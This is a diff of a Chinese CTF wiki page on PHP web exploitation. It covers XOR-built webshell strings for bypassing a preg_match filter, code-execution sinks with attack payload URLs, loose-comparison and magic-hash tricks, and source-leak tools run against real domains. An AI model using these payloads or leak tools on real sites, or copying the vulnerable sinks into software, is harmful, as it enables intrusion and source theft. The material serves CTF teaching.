-    echo &quot;{&quot;^&quot;&lt;&quot;;
-?&gt;
-</code></pre></div> <p>输出结果为：</p> <p><img alt src=../figure/preg_match/answer3.png></p> <div class=highlight><pre><span></span><code>&lt;?php
-    echo &quot;{&quot;^&quot;&gt;&quot;;
-?&gt;
-</code></pre></div> <p>输出结果为：</p> <p><img alt src=../figure/preg_match/answer4.png></p> <div class=highlight><pre><span></span><code>&lt;?php
-    echo &quot;{&quot;^&quot;/&quot;;
-?&gt;
-</code></pre></div> <p>输出结果为：</p> <p><img alt src=../figure/preg_match/answer5.png></p> <p>所以我们可以知道， <code>_GET</code> 就是这么被构造出来的啦！</p> <h4 id=_get_1>获取 <code>_GET</code> 参数<a class=headerlink href=#_get_1 title="Permanent link">&para;</a></h4> <p>我们又该如何获取 <code>_GET</code> 参数呢？咱们可以构造出如下字串：</p> <div class=highlight><pre><span></span><code>&lt;?php
+?&gt;</code></pre>
+<p>在这里我说明下， <code>.=</code> 是字符串的连接，具体参看 <code>PHP</code> 语法</p>
+<p>我们甚至可以将上面的代码合并为一行，从而使程序的可读性更差，代码如下：</p>
+<pre class="highlight"><code>$__=("#"^"|").("."^"~").("/"^"`").("|"^"/").("{"^"/");</code></pre>
+<p>我们回到 <code>xman</code> 训练赛的那题来看，我们的想法是通过构造异或来去绕过那串字符，那么我们该如何构造这个字串使得长度小于 <code>40</code> 呢？</p>
+<p>我们最终是要读取到那个 <code>getFlag</code> 函数，我们需要构造一个 <code>_GET</code> 来去读取这个函数，我们最终构造了如下字符串：</p>
+<p><img alt="" src="../figure/preg_match/payloads.png" /></p>
+<p>可能很多小伙伴看到这里仍然无法理解这段字符串是如何构造的吧，我们就对这段字符串进行段分析。</p>
+<h4 id="_get">构造 <code>_GET</code> 读取<a class="headerlink" href="#_get" title="Permanent link">&para;</a></h4>
+<p>首先我们得知道 <code>_GET</code> 由什么异或而来的，经过我的尝试与分析，我得出了下面的结论：</p>
+<pre class="highlight"><code>&lt;?php
+    echo "`{{{"^"?&lt;&gt;/";//_GET
+?&gt;</code></pre>
+<p>这段代码一大坨是啥意思呢？因为40个字符长度的限制，导致以前逐个字符异或拼接的webshell不能使用。<br />
+这里可以使用php中可以执行命令的反引号 <code>`</code> 和 <code>Linux</code> 下面的通配符 <code>?</code></p>
+<ul>
+<li><code>?</code> 代表匹配一个字符</li>
+<li><code>`</code> 表示执行命令</li>
+<li><code>"</code> 对特殊字符串进行解析</li>
+</ul>
+<p>由于 <code>?</code> 只能匹配一个字符，这种写法的意思是循环调用，分别匹配。我们将其进行分解来看：</p>
+<pre class="highlight"><code>&lt;?php
+    echo "{"^"&lt;";
+?&gt;</code></pre>
+<p>输出结果为：</p>
+<p><img alt="" src="../figure/preg_match/answer3.png" /></p>
+<pre class="highlight"><code>&lt;?php
+    echo "{"^"&gt;";
+?&gt;</code></pre>
+<p>输出结果为：</p>
+<p><img alt="" src="../figure/preg_match/answer4.png" /></p>
+<pre class="highlight"><code>&lt;?php
+    echo "{"^"/";
+?&gt;</code></pre>
+<p>输出结果为：</p>
+<p><img alt="" src="../figure/preg_match/answer5.png" /></p>
+<p>所以我们可以知道， <code>_GET</code> 就是这么被构造出来的啦！</p>
+<h4 id="_get_1">获取 <code>_GET</code> 参数<a class="headerlink" href="#_get_1" title="Permanent link">&para;</a></h4>
+<p>我们又该如何获取 <code>_GET</code> 参数呢？咱们可以构造出如下字串：</p>
+<pre class="highlight"><code>&lt;?php
     echo ${$_}[_](${$_}[__]);//$_GET[_]($_GET[__])
-?&gt;
-</code></pre></div> <p>根据前面构造的来看， <code>$_</code> 已经变成了 <code>_GET</code> 。顺理成章的来讲， <code>$_ = _GET</code> 。我们构建 <code>$_GET[__]</code> 是为了要获取参数值。</p> <h4 id=_10>传入参数<a class=headerlink href=#_10 title="Permanent link">&para;</a></h4> <p>此时我们只需要去调用 <code>getFlag</code> 函数获取 <code>webshell</code> 就好了，构造如下：</p> <div class=highlight><pre><span></span><code>&lt;?php
+?&gt;</code></pre>
+<p>根据前面构造的来看， <code>$_</code> 已经变成了 <code>_GET</code> 。顺理成章的来讲， <code>$_ = _GET</code> 。我们构建 <code>$_GET[__]</code> 是为了要获取参数值。</p>
+<h4 id="_10">传入参数<a class="headerlink" href="#_10" title="Permanent link">&para;</a></h4>
+<p>此时我们只需要去调用 <code>getFlag</code> 函数获取 <code>webshell</code> 就好了，构造如下：</p>
+<pre class="highlight"><code>&lt;?php
     echo $_=getFlag;//getFlag
-?&gt;
-</code></pre></div> <p>所以把参数全部连接起来，就可以了。</p> <p><img alt src=../figure/preg_match/payloads.png></p> <p>结果如下：</p> <p><img alt src=../figure/preg_match/flag.png></p> <p>于是我们就成功地读取到了flag！</p> <h3 id=_11>动态函数执行<a class=headerlink href=#_11 title="Permanent link">&para;</a></h3> <p>用户自定义的函数可以导致代码执行。</p> <div class=highlight><pre><span></span><code><span class=cp>&lt;?php</span>
-<span class=nv>$dyn_func</span> <span class=o>=</span> <span class=nv>$_GET</span><span class=p>[</span><span class=s2>&quot;dyn_func&quot;</span><span class=p>];</span>
-<span class=nv>$argument</span> <span class=o>=</span> <span class=nv>$_GET</span><span class=p>[</span><span class=s2>&quot;argument&quot;</span><span class=p>];</span>
-<span class=nv>$dyn_func</span><span class=p>(</span><span class=nv>$argument</span><span class=p>);</span>
-<span class=cp>?&gt;</span><span class=x></span>
-</code></pre></div> <h3 id=_12>反引号命令执行<a class=headerlink href=#_12 title="Permanent link">&para;</a></h3> <div class=highlight><pre><span></span><code><span class=cp>&lt;?php</span>
-<span class=k>echo</span> <span class=sb>`ls -al`</span><span class=p>;</span>
-<span class=cp>?&gt;</span><span class=x></span>
-</code></pre></div> <h3 id=curly-syntax>Curly Syntax<a class=headerlink href=#curly-syntax title="Permanent link">&para;</a></h3> <p>PHP 的 Curly Syntax 也能导致代码执行，它将执行花括号间的代码，并将结果替换回去。</p> <div class=highlight><pre><span></span><code><span class=cp>&lt;?php</span>
-<span class=nv>$var</span> <span class=o>=</span> <span class=s2>&quot;aaabbbccc </span><span class=si>${</span><span class=nv>`ls`</span><span class=si>}</span><span class=s2>&quot;</span><span class=p>;</span>
-<span class=cp>?&gt;</span><span class=x></span>
-</code></pre></div> <div class=highlight><pre><span></span><code><span class=cp>&lt;?php</span>
-<span class=nv>$foobar</span> <span class=o>=</span> <span class=s2>&quot;phpinfo&quot;</span><span class=p>;</span>
-<span class=err>$</span><span class=p>{</span><span class=s2>&quot;foobar&quot;</span><span class=p>}();</span>
-<span class=cp>?&gt;</span><span class=x></span>
-</code></pre></div> <h3 id=_13>回调函数<a class=headerlink href=#_13 title="Permanent link">&para;</a></h3> <p>很多函数都可以执行回调函数，当回调函数用户可控时，将导致代码执行。</p> <div class=highlight><pre><span></span><code><span class=cp>&lt;?php</span>
-<span class=nv>$evil_callback</span> <span class=o>=</span> <span class=nv>$_GET</span><span class=p>[</span><span class=s2>&quot;callback&quot;</span><span class=p>];</span>
-<span class=nv>$some_array</span> <span class=o>=</span> <span class=k>array</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span><span class=mi>1</span><span class=p>,</span><span class=mi>2</span><span class=p>,</span><span class=mi>3</span><span class=p>);</span>
-<span class=nv>$new_array</span> <span class=o>=</span> <span class=nb>array_map</span><span class=p>(</span><span class=nv>$evil_callback</span><span class=p>,</span> <span class=nv>$some_array</span><span class=p>);</span>
-<span class=cp>?&gt;</span><span class=x></span>
-</code></pre></div> <p>攻击 payload</p> <div class=highlight><pre><span></span><code>http://www.a.com/index.php?callback=phpinfo
-</code></pre></div> <h3 id=_14>反序列化<a class=headerlink href=#_14 title="Permanent link">&para;</a></h3> <p>如果 <code>unserialize()</code> 在执行时定义了 <code>__destruct()</code> 或 <code>__wakeup()</code> 函数，则有可能导致代码执行。</p> <div class=highlight><pre><span></span><code><span class=cp>&lt;?php</span>
-<span class=k>class</span> <span class=nc>Example</span> <span class=p>{</span>
-  <span class=k>var</span> <span class=nv>$var</span> <span class=o>=</span> <span class=s2>&quot;&quot;</span><span class=p>;</span>
-  <span class=k>function</span> <span class=fm>__destruct</span><span class=p>()</span> <span class=p>{</span>
-    <span class=k>eval</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>var</span><span class=p>);</span>
-  <span class=p>}</span>
-<span class=p>}</span>
-<span class=nb>unserialize</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=s2>&quot;saved_code&quot;</span><span class=p>]);</span>
-<span class=cp>?&gt;</span><span class=x></span>
-</code></pre></div> <p>攻击 payload</p> <div class=highlight><pre><span></span><code>http://www.a.com/index.php?saved_code=O:7:&quot;Example&quot;:1:{s:3:&quot;var&quot;;s:10:&quot;phpinfo();&quot;;}
-</code></pre></div> <h2 id=php_1>PHP 特性<a class=headerlink href=#php_1 title="Permanent link">&para;</a></h2> <h3 id=_15>数组<a class=headerlink href=#_15 title="Permanent link">&para;</a></h3> <div class=highlight><pre><span></span><code><span class=cp>&lt;?php</span>
-<span class=nv>$var</span> <span class=o>=</span> <span class=mi>1</span><span class=p>;</span>
-<span class=nv>$var</span> <span class=o>=</span> <span class=k>array</span><span class=p>();</span>
-<span class=nv>$var</span> <span class=o>=</span> <span class=s2>&quot;string&quot;</span><span class=p>;</span>
-<span class=cp>?&gt;</span><span class=x></span>
-</code></pre></div> <p>php 不会严格检验传入的变量类型，也可以将变量自由的转换类型。</p> <p>比如在 <code>$a == $b</code> 的比较中</p> <div class=highlight><pre><span></span><code><span class=x>$a = null; </span>
-<span class=x>$b = false; //为真 </span>
-<span class=x>$a = &#39;&#39;; </span>
-<span class=x>$b = 0; //同样为真</span>
-</code></pre></div> <p>然而，PHP 内核的开发者原本是想让程序员借由这种不需要声明的体系，更加高效的开发，所以在几乎所有内置函数以及基本结构中使用了很多松散的比较和转换，防止程序中的变量因为程序员的不规范而频繁的报错，然而这却带来了安全问题。</p> <div class=highlight><pre><span></span><code><span class=x>0==&#39;0&#39; //true</span>
-<span class=x>0 == &#39;abcdefg&#39; //true</span>
-<span class=x>0 === &#39;abcdefg&#39; //false</span>
-<span class=x>1 == &#39;1abcdef&#39; //true</span>
-</code></pre></div> <h3 id=hash>魔法 Hash<a class=headerlink href=#hash title="Permanent link">&para;</a></h3> <div class=highlight><pre><span></span><code><span class=x>&quot;0e132456789&quot;==&quot;0e7124511451155&quot; //true</span>
-<span class=x>&quot;0e123456abc&quot;==&quot;0e1dddada&quot; //false</span>
-<span class=x>&quot;0e1abc&quot;==&quot;0&quot;  //true</span>
-</code></pre></div> <p>在进行比较运算时，如果遇到了 <code>0e\d+</code> 这种字符串，就会将这种字符串解析为科学计数法。所以上面例子中 2 个数的值都是 0 因而就相等了。如果不满足 <code>0e\d+</code> 这种模式就不会相等。</p> <h3 id=_16>十六进制转换<a class=headerlink href=#_16 title="Permanent link">&para;</a></h3> <div class=highlight><pre><span></span><code><span class=x>&quot;0x1e240&quot;==&quot;123456&quot; //true</span>
-<span class=x>&quot;0x1e240&quot;==123456 //true</span>
-<span class=x>&quot;0x1e240&quot;==&quot;1e240&quot; //false</span>
-</code></pre></div> <p>当其中的一个字符串是 <code>0x</code> 开头的时候，PHP 会将此字符串解析成为十进制然后再进行比较，<code>0x1240</code> 解析成为十进制就是 123456，所以与 <code>int</code> 类型和 <code>string</code> 类型的 123456 比较都是相等。</p> <h3 id=_17>类型转换<a class=headerlink href=#_17 title="Permanent link">&para;</a></h3> <p>常见的转换主要就是 <code>int</code> 转换为 <code>string</code>，<code>string</code> 转换为 <code>int</code>。</p> <p><code>int</code> 转 <code>string</code></p> <div class=highlight><pre><span></span><code><span class=x>$var = 5;</span>
-<span class=x>方式1：$item = (string)$var;</span>
-<span class=x>方式2：$item = strval($var);</span>
-</code></pre></div> <p><code>string</code> 转 <code>int</code>：<code>intval()</code> 函数。</p> <p>对于这个函数，可以先看 2 个例子。</p> <div class=highlight><pre><span></span><code><span class=x>var_dump(intval(&#39;2&#39;)) //2</span>
-<span class=x>var_dump(intval(&#39;3abcd&#39;)) //3</span>
-<span class=x>var_dump(intval(&#39;abcd&#39;)) //0</span>
-</code></pre></div> <p>说明 <code>intval()</code> 转换的时候，会从字符串的开始进行转换直到遇到一个非数字的字符。即使出现无法转换的字符串， <code>intval()</code> 不会报错而是返回 0。</p> <p>同时，程序员在编程的时候也不应该使用如下的这段代码：</p> <div class=highlight><pre><span></span><code><span class=x>if(intval($a)&gt;1000) {</span>
-<span class=x> mysql_query(&quot;select * from news where id=&quot;.$a)</span>
-<span class=x>}</span>
-</code></pre></div> <p>这个时候 <code>$a</code> 的值有可能是 <code>1002 union</code>。</p> <h3 id=_18>内置函数的参数的松散性<a class=headerlink href=#_18 title="Permanent link">&para;</a></h3> <p>内置函数的松散性说的是，调用函数时给函数传递函数无法接受的参数类型。解释起来有点拗口，还是直接通过实际的例子来说明问题，下面会重点介绍几个这种函数。</p> <p><strong>md5()</strong></p> <div class=highlight><pre><span></span><code><span class=x>$array1[] = array(</span>
-<span class=x> &quot;foo&quot; =&gt; &quot;bar&quot;,</span>
-<span class=x> &quot;bar&quot; =&gt; &quot;foo&quot;,</span>
-<span class=x>);</span>
-<span class=x>$array2 = array(&quot;foo&quot;, &quot;bar&quot;, &quot;hello&quot;, &quot;world&quot;);</span>
-<span class=x>var_dump(md5($array1)==md5($array2)); //true</span>
-</code></pre></div> <p>PHP 手册中的 md5（）函数的描述是 <code>string md5 ( string $str [, bool $raw_output = false ] )</code>，<code>md5()</code> 中的需要是一个 string 类型的参数。但是当你传递一个 array 时，<code>md5()</code> 不会报错，只是会无法正确地求出 array 的 md5 值，这样就会导致任意 2 个 array 的 md5 值都会相等。</p> <p><strong>strcmp()</strong></p> <p><code>strcmp()</code> 函数在 PHP 官方手册中的描述是 <code>intstrcmp ( string $str1 ， string $str2 )</code>，需要给 <code>strcmp()</code> 传递 2 个 <code>string</code> 类型的参数。如果 <code>str1</code> 小于 <code>str2</code>，返回 -1，相等返回 0，否则返回 1。<code>strcmp()</code> 函数比较字符串的本质是将两个变量转换为 ASCII，然后进行减法运算，然后根据运算结果来决定返回值。</p> <p>如果传入给出 <code>strcmp()</code> 的参数是数字呢？</p> <div class=highlight><pre><span></span><code><span class=x>$array=[1,2,3];</span>
-<span class=x>var_dump(strcmp($array,&#39;123&#39;)); //null,在某种意义上null也就是相当于false。</span>
-</code></pre></div> <p><strong>switch()</strong></p> <p>如果 <code>switch()</code> 是数字类型的 case 的判断时，switch 会将其中的参数转换为 int 类型。如下：</p> <div class=highlight><pre><span></span><code><span class=x>$i =&quot;2abc&quot;;</span>
-<span class=x>switch ($i) {</span>
-<span class=x>case 0:</span>
-<span class=x>case 1:</span>
-<span class=x>case 2:</span>
-<span class=x> echo &quot;i is less than 3 but not negative&quot;;</span>
-<span class=x> break;</span>
-<span class=x>case 3:</span>
-<span class=x> echo &quot;i is 3&quot;;</span>
-<span class=x>}</span>
-</code></pre></div> <p>这个时候程序输出的是 <code>i is less than 3 but not negative</code> ，是由于 <code>switch()</code> 函数将 <code>$i</code> 进行了类型转换，转换结果为 2。</p> <p><strong>in_array()</strong></p> <p>在 PHP 手册中， <code>in_array()</code> 函数的解释是 <code>bool in_array ( mixed $needle , array $haystack [, bool $strict = FALSE ] )</code> ,如果strict参数没有提供，那么 <code>in_array</code> 就会使用松散比较来判断 <code>$needle</code> 是否在 <code>$haystack</code> 中。当 strict 的值为 true 时， <code>in_array()</code> 会比较 needls 的类型和 haystack 中的类型是否相同。</p> <div class=highlight><pre><span></span><code><span class=x>$array=[0,1,2,&#39;3&#39;];</span>
-<span class=x>var_dump(in_array(&#39;abc&#39;, $array)); //true</span>
-<span class=x>var_dump(in_array(&#39;1bc&#39;, $array)); //true</span>
-</code></pre></div> <p>可以看到上面的情况返回的都是 true，因为 <code>'abc'</code> 会转换为 0， <code>'1bc'</code> 转换为 1。</p> <p><code>array_search()</code> 与 <code>in_array()</code> 也是一样的问题。</p> <h2 id=_19>寻找源代码备份<a class=headerlink href=#_19 title="Permanent link">&para;</a></h2> <h3 id=hg>hg 源码泄露<a class=headerlink href=#hg title="Permanent link">&para;</a></h3> <p><code>hg init</code> 时会产生 <code>.hg</code> 文件。</p> <p><a href=https://github.com/kost/dvcs-ripper>利用工具 dvcs-ripper</a></p> <h3 id=git>Git 源码泄露<a class=headerlink href=#git title="Permanent link">&para;</a></h3> <p><code>.git</code> 目录内有代码的变更记录等文件，如果部署时该目录下的文件可被访问，可能会被利用来恢复源代码。</p> <div class=highlight><pre><span></span><code>/.git
+?&gt;</code></pre>
+<p>所以把参数全部连接起来，就可以了。</p>
+<p><img alt="" src="../figure/preg_match/payloads.png" /></p>
+<p>结果如下：</p>
+<p><img alt="" src="../figure/preg_match/flag.png" /></p>
+<p>于是我们就成功地读取到了flag！</p>
+<h3 id="_11">动态函数执行<a class="headerlink" href="#_11" title="Permanent link">&para;</a></h3>
+<p>用户自定义的函数可以导致代码执行。</p>
+<pre class="highlight"><code class="language-php">&lt;?php
+$dyn_func = $_GET["dyn_func"];
+$argument = $_GET["argument"];
+$dyn_func($argument);
+?&gt;</code></pre>
+<h3 id="_12">反引号命令执行<a class="headerlink" href="#_12" title="Permanent link">&para;</a></h3>
+<pre class="highlight"><code class="language-php">&lt;?php
+echo `ls -al`;
+?&gt;</code></pre>
+<h3 id="curly-syntax">Curly Syntax<a class="headerlink" href="#curly-syntax" title="Permanent link">&para;</a></h3>
+<p>PHP 的 Curly Syntax 也能导致代码执行，它将执行花括号间的代码，并将结果替换回去。</p>
+<pre class="highlight"><code class="language-php">&lt;?php
+$var = "aaabbbccc ${`ls`}";
+?&gt;</code></pre>
+<pre class="highlight"><code class="language-php">&lt;?php
+$foobar = "phpinfo";
+${"foobar"}();
+?&gt;</code></pre>
+<h3 id="_13">回调函数<a class="headerlink" href="#_13" title="Permanent link">&para;</a></h3>
+<p>很多函数都可以执行回调函数，当回调函数用户可控时，将导致代码执行。</p>
+<pre class="highlight"><code class="language-php">&lt;?php
+$evil_callback = $_GET["callback"];
+$some_array = array(0,1,2,3);
+$new_array = array_map($evil_callback, $some_array);
+?&gt;</code></pre>
+<p>攻击 payload</p>
+<pre class="highlight"><code>http://www.a.com/index.php?callback=phpinfo</code></pre>
+<h3 id="_14">反序列化<a class="headerlink" href="#_14" title="Permanent link">&para;</a></h3>
+<p>如果 <code>unserialize()</code> 在执行时定义了 <code>__destruct()</code> 或 <code>__wakeup()</code> 函数，则有可能导致代码执行。</p>
+<pre class="highlight"><code class="language-php">&lt;?php
+class Example {
+  var $var = "";
+  function __destruct() {
+    eval($this-&gt;var);
+  }
+}
+unserialize($_GET["saved_code"]);
+?&gt;</code></pre>
+<p>攻击 payload</p>
+<pre class="highlight"><code>http://www.a.com/index.php?saved_code=O:7:"Example":1:{s:3:"var";s:10:"phpinfo();";}</code></pre>
+<h2 id="php_1">PHP 特性<a class="headerlink" href="#php_1" title="Permanent link">&para;</a></h2>
+<h3 id="_15">数组<a class="headerlink" href="#_15" title="Permanent link">&para;</a></h3>
+<pre class="highlight"><code class="language-php">&lt;?php
+$var = 1;
+$var = array();
+$var = "string";
+?&gt;</code></pre>
+<p>php 不会严格检验传入的变量类型，也可以将变量自由的转换类型。</p>
+<p>比如在 <code>$a == $b</code> 的比较中</p>
+<pre class="highlight"><code class="language-php">$a = null; 
+$b = false; //为真 
+$a = ''; 
+$b = 0; //同样为真</code></pre>
+<p>然而，PHP 内核的开发者原本是想让程序员借由这种不需要声明的体系，更加高效的开发，所以在几乎所有内置函数以及基本结构中使用了很多松散的比较和转换，防止程序中的变量因为程序员的不规范而频繁的报错，然而这却带来了安全问题。</p>
+<pre class="highlight"><code class="language-php">0=='0' //true
+0 == 'abcdefg' //true
+0 === 'abcdefg' //false
+1 == '1abcdef' //true</code></pre>
+<h3 id="hash">魔法 Hash<a class="headerlink" href="#hash" title="Permanent link">&para;</a></h3>
+<pre class="highlight"><code class="language-php">"0e132456789"=="0e7124511451155" //true
+"0e123456abc"=="0e1dddada" //false
+"0e1abc"=="0"  //true</code></pre>
+<p>在进行比较运算时，如果遇到了 <code>0e\d+</code> 这种字符串，就会将这种字符串解析为科学计数法。所以上面例子中 2 个数的值都是 0 因而就相等了。如果不满足 <code>0e\d+</code> 这种模式就不会相等。</p>
+<h3 id="_16">十六进制转换<a class="headerlink" href="#_16" title="Permanent link">&para;</a></h3>
+<pre class="highlight"><code class="language-php">"0x1e240"=="123456" //true
+"0x1e240"==123456 //true
+"0x1e240"=="1e240" //false</code></pre>
+<p>当其中的一个字符串是 <code>0x</code> 开头的时候，PHP 会将此字符串解析成为十进制然后再进行比较，<code>0x1240</code> 解析成为十进制就是 123456，所以与 <code>int</code> 类型和 <code>string</code> 类型的 123456 比较都是相等。</p>
+<h3 id="_17">类型转换<a class="headerlink" href="#_17" title="Permanent link">&para;</a></h3>
+<p>常见的转换主要就是 <code>int</code> 转换为 <code>string</code>，<code>string</code> 转换为 <code>int</code>。</p>
+<p><code>int</code> 转 <code>string</code></p>
+<pre class="highlight"><code class="language-php">$var = 5;
+方式1：$item = (string)$var;
+方式2：$item = strval($var);</code></pre>
+<p><code>string</code> 转 <code>int</code>：<code>intval()</code> 函数。</p>
+<p>对于这个函数，可以先看 2 个例子。</p>
+<pre class="highlight"><code class="language-php">var_dump(intval('2')) //2
+var_dump(intval('3abcd')) //3
+var_dump(intval('abcd')) //0</code></pre>
+<p>说明 <code>intval()</code> 转换的时候，会从字符串的开始进行转换直到遇到一个非数字的字符。即使出现无法转换的字符串， <code>intval()</code> 不会报错而是返回 0。</p>
+<p>同时，程序员在编程的时候也不应该使用如下的这段代码：</p>
+<pre class="highlight"><code class="language-php">if(intval($a)&gt;1000) {
+ mysql_query("select * from news where id=".$a)
+}</code></pre>
+<p>这个时候 <code>$a</code> 的值有可能是 <code>1002 union</code>。</p>
+<h3 id="_18">内置函数的参数的松散性<a class="headerlink" href="#_18" title="Permanent link">&para;</a></h3>
+<p>内置函数的松散性说的是，调用函数时给函数传递函数无法接受的参数类型。解释起来有点拗口，还是直接通过实际的例子来说明问题，下面会重点介绍几个这种函数。</p>
+<p><strong>md5()</strong></p>
+<pre class="highlight"><code class="language-php">$array1[] = array(
+ "foo" =&gt; "bar",
+ "bar" =&gt; "foo",
+);
+$array2 = array("foo", "bar", "hello", "world");
+var_dump(md5($array1)==md5($array2)); //true</code></pre>
+<p>PHP 手册中的 md5（）函数的描述是 <code>string md5 ( string $str [, bool $raw_output = false ] )</code>，<code>md5()</code> 中的需要是一个 string 类型的参数。但是当你传递一个 array 时，<code>md5()</code> 不会报错，只是会无法正确地求出 array 的 md5 值，这样就会导致任意 2 个 array 的 md5 值都会相等。</p>
+<p><strong>strcmp()</strong></p>
+<p><code>strcmp()</code> 函数在 PHP 官方手册中的描述是 <code>intstrcmp ( string $str1 ， string $str2 )</code>，需要给 <code>strcmp()</code> 传递 2 个 <code>string</code> 类型的参数。如果 <code>str1</code> 小于 <code>str2</code>，返回 -1，相等返回 0，否则返回 1。<code>strcmp()</code> 函数比较字符串的本质是将两个变量转换为 ASCII，然后进行减法运算，然后根据运算结果来决定返回值。</p>
+<p>如果传入给出 <code>strcmp()</code> 的参数是数字呢？</p>
+<pre class="highlight"><code class="language-php">$array=[1,2,3];
+var_dump(strcmp($array,'123')); //null,在某种意义上null也就是相当于false。</code></pre>
+<p><strong>switch()</strong></p>
+<p>如果 <code>switch()</code> 是数字类型的 case 的判断时，switch 会将其中的参数转换为 int 类型。如下：</p>
+<pre class="highlight"><code class="language-php">$i ="2abc";
+switch ($i) {
+case 0:
+case 1:
+case 2:
+ echo "i is less than 3 but not negative";
+ break;
+case 3:
+ echo "i is 3";
+}</code></pre>
+<p>这个时候程序输出的是 <code>i is less than 3 but not negative</code> ，是由于 <code>switch()</code> 函数将 <code>$i</code> 进行了类型转换，转换结果为 2。</p>
+<p><strong>in_array()</strong></p>
+<p>在 PHP 手册中， <code>in_array()</code> 函数的解释是 <code>bool in_array ( mixed $needle , array $haystack [, bool $strict = FALSE ] )</code> ,如果strict参数没有提供，那么 <code>in_array</code> 就会使用松散比较来判断 <code>$needle</code> 是否在 <code>$haystack</code> 中。当 strict 的值为 true 时， <code>in_array()</code> 会比较 needls 的类型和 haystack 中的类型是否相同。</p>
+<pre class="highlight"><code class="language-php">$array=[0,1,2,'3'];
+var_dump(in_array('abc', $array)); //true
+var_dump(in_array('1bc', $array)); //true</code></pre>
+<p>可以看到上面的情况返回的都是 true，因为 <code>'abc'</code> 会转换为 0， <code>'1bc'</code> 转换为 1。</p>
+<p><code>array_search()</code> 与 <code>in_array()</code> 也是一样的问题。</p>
+<h2 id="_19">寻找源代码备份<a class="headerlink" href="#_19" title="Permanent link">&para;</a></h2>
+<h3 id="hg">hg 源码泄露<a class="headerlink" href="#hg" title="Permanent link">&para;</a></h3>
+<p><code>hg init</code> 时会产生 <code>.hg</code> 文件。</p>
+<p><a href="https://github.com/kost/dvcs-ripper">利用工具 dvcs-ripper</a></p>
+<h3 id="git">Git 源码泄露<a class="headerlink" href="#git" title="Permanent link">&para;</a></h3>
+<p><code>.git</code> 目录内有代码的变更记录等文件，如果部署时该目录下的文件可被访问，可能会被利用来恢复源代码。</p>
+<pre class="highlight"><code>/.git
 /.git/HEAD
 /.git/index
 /.git/config
-/.git/description
-</code></pre></div> <p><a href=https://github.com/lijiejie/GitHack>GitHack</a></p> <div class=highlight><pre><span></span><code>python GitHack.py http://www.openssl.org/.git/
-</code></pre></div> <p><a href=https://github.com/WangYihang/GitHacker>GitHacker（可恢复完整 Git 仓库）</a></p> <div class=highlight><pre><span></span><code>python GitHacker.py http://www.openssl.org/.git/
-</code></pre></div> <h3 id=ds_store><code>.DS_Store</code> 文件泄露<a class=headerlink href=#ds_store title="Permanent link">&para;</a></h3> <p>Mac OS 中会包含有 <code>.DS_Store</code> 文件，包含文件名等信息。</p> <p><a href=https://github.com/lijiejie/ds_store_exp>利用工具 ds_store_exp</a></p> <div class=highlight><pre><span></span><code>python ds_store_exp.py http://hd.zj.qq.com/themes/galaxyw/.DS_Store
+/.git/description</code></pre>
+<p><a href="https://github.com/lijiejie/GitHack">GitHack</a></p>
+<pre class="highlight"><code class="language-shell">python GitHack.py http://www.openssl.org/.git/</code></pre>
+<p><a href="https://github.com/WangYihang/GitHacker">GitHacker（可恢复完整 Git 仓库）</a></p>
+<pre class="highlight"><code class="language-shell">python GitHacker.py http://www.openssl.org/.git/</code></pre>
+<h3 id="ds_store"><code>.DS_Store</code> 文件泄露<a class="headerlink" href="#ds_store" title="Permanent link">&para;</a></h3>
+<p>Mac OS 中会包含有 <code>.DS_Store</code> 文件，包含文件名等信息。</p>
+<p><a href="https://github.com/lijiejie/ds_store_exp">利用工具 ds_store_exp</a></p>
+<pre class="highlight"><code class="language-shell">python ds_store_exp.py http://hd.zj.qq.com/themes/galaxyw/.DS_Store
 
 hd.zj.qq.com/
 └── themes
@@ -290,20 +1436,124 @@ hd.zj.qq.com/
                     └── lib
                         └── jquery.min.js
 
-<span class=m>21</span> directories, <span class=m>48</span> files
-</code></pre></div> <h3 id=_20>网站备份文件<a class=headerlink href=#_20 title="Permanent link">&para;</a></h3> <p>管理员备份网站文件后错误地将备份放在 Web 目录下。</p> <p>常见的后缀名：</p> <div class=highlight><pre><span></span><code>.rar
+21 directories, 48 files</code></pre>
+<h3 id="_20">网站备份文件<a class="headerlink" href="#_20" title="Permanent link">&para;</a></h3>
+<p>管理员备份网站文件后错误地将备份放在 Web 目录下。</p>
+<p>常见的后缀名：</p>
+<pre class="highlight"><code>.rar
 .zip
 .7z
 .tar
 .tar.gz
 .bak
-.txt
-</code></pre></div> <h3 id=svn>SVN 泄露<a class=headerlink href=#svn title="Permanent link">&para;</a></h3> <p>敏感文件：</p> <div class=highlight><pre><span></span><code>/.svn
+.txt</code></pre>
+<h3 id="svn">SVN 泄露<a class="headerlink" href="#svn" title="Permanent link">&para;</a></h3>
+<p>敏感文件：</p>
+<pre class="highlight"><code>/.svn
 /.svn/wc.db
-/.svn/entries
-</code></pre></div> <p><a href=https://github.com/kost/dvcs-ripper>dvcs-ripper</a></p> <div class=highlight><pre><span></span><code>perl rip-svn.pl -v -u http://www.example.com/.svn/
-</code></pre></div> <p><a href=http://tools.40huo.cn/#!web.md#源码泄露>Seay - SVN</a></p> <h3 id=web-inf-webxml>WEB-INF / web.xml 泄露<a class=headerlink href=#web-inf-webxml title="Permanent link">&para;</a></h3> <p>WEB-INF 是 Java Web 应用的安全目录，web.xml 中有文件的映射关系。</p> <p>WEB-INF 主要包含一下文件或目录：</p> <ul> <li><code>/WEB-INF/web.xml</code> ：Web 应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。</li> <li><code>/WEB-INF/classes/</code> ：含了站点所有用的 class 文件，包括 servlet class 和非 servlet class，他们不能包含在 jar 文件中。</li> <li><code>/WEB-INF/lib/</code> ：存放 web 应用需要的各种 JAR 文件，放置仅在这个应用中要求使用的 jar 文件，如数据库驱动 jar 文件。</li> <li><code>/WEB-INF/src/</code> ：源码目录，按照包名结构放置各个 java 文件。</li> <li><code>/WEB-INF/database.properties</code> ：数据库配置文件。</li> </ul> <p>通过找到 web.xml 文件，推断 class 文件的路径，最后直接 class 文件，再通过反编译 class 文件，得到网站源码。 一般情况，jsp 引擎默认都是禁止访问 WEB-INF 目录的，Nginx 配合 Tomcat 做均衡负载或集群等情况时，问题原因其实很简单，Nginx 不会去考虑配置其他类型引擎（Nginx 不是 jsp 引擎）导致的安全问题而引入到自身的安全规范中来（这样耦合性太高了），修改 Nginx 配置文件禁止访问 WEB-INF 目录就好了：</p> <div class=highlight><pre><span></span><code><span class=k>location</span> <span class=p>~</span> <span 